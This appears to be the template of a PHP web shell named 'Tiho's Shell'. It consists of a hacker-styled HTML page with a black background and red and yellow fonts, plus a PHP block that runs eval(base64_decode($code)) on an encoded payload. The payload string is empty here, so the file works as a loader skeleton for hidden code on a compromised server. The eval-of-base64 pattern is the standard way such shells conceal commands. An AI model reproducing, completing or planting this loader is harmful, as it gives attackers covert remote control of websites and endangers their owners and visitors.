<html>
  <head>
  <link href='http://res7ock.org/assets/img/favicon.png' rel='shortcut icon' alt='icon'>
  <title>Tiho's Shell</title>
<center><h1><font face="Sarpanch"> &#9884; Tiho's Shell &#9884;</h1></center>
  <meta name='author' content='k0v3T Shell'>
  <meta charset="UTF-8">
  <link href="" rel="stylesheet" type="text/css">

<style>
body{
font-family: "Sarpanch", cursive;
    background-image: url("#");
    color:red;
    background-attachment:fixed;
    background-repeat:no-repeat;
    background-position:center;
    background-color:#000;
    -webkit-background-size: 100% 100%;
}
#content tr:hover{
background-color:white;
text-shadow:1px 0px 0px #000;
}
#content .first{
background-color: yellow;
font-weight: bold;
}
H1{
color:yellow;
font-family: "Sarpanch", cursive;
}
#content .first:hover{
background-color: yellow;
text-shadow:1px 0px 0px #000;
}
table{
border: 0px red solid;
}
a{
color: yellow;
text-decoration: none;
}
a:hover{
color: white;
text-shadow:1px 0px 0px #000;
}
.tombols{
background:black;
color:yellow;
border-top:0;
border-left:0;
border-right:0;
border: 2px white solid;
padding:5px 8px;
text-decoration:none;
font-family: 'Sarpanch', sans-serif;
border-radius:5px;
}
textarea{
color:white;
background-color:transparent;
font-weight: bold;
padding:5px 8px;
font-family: "Sarpanch", cursive;
border: 2px white solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}
input,select{
color:yellow;
background-color:black;
font-weight: bold;
font-family: "Sarpanch", cursive;
border: 2px white solid;
}
</style>
</head>

<link href="https://fonts.googleapis.com/css?family=Courgette" rel="stylesheet">
<link href="https://fonts.googleapis.com/css?family=Sarpanch|Teko" rel="stylesheet">
<?php
$code = '';
eval(base64_decode($code));
?>
